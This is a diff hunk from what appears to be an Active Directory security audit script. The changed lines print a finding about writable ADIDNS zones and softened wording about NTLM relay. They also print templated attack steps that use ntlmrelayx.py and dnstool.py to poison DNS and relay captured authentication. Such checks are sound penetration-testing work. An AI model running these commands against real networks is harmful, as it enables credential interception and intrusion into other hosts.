@@ -596,7 +596,7 @@ if echo "$ADIDNS_TEST" | grep -q "completed successfully"; then
   fi
   echo -e "${RED}[KO] ADIDNS zone write possible (ADIDNS Poisoning)${NC}"
   if [ "$RELAY_COUNT" -gt 0 ]; then
-    echo -e "${RED}       └─ ADIDNS Poisoning + NTLM Relay possible${NC}"
+    echo -e "${RED}       └─ ADIDNS Poisoning + NTLM Relay might be possible${NC}"
     echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
     echo -e "${GREY}          2) dnstool.py -u '$DOMAIN\\$AD_USER' -p '$PASSWORD' -r '<existing-fileshare-server>' -a add -d <YOUR_IP> $DC_IP${NC}"
     echo -e "${GREY}          3) Wait for auth to \\\\<hostname>\\share → relay to non-DC target${NC}"
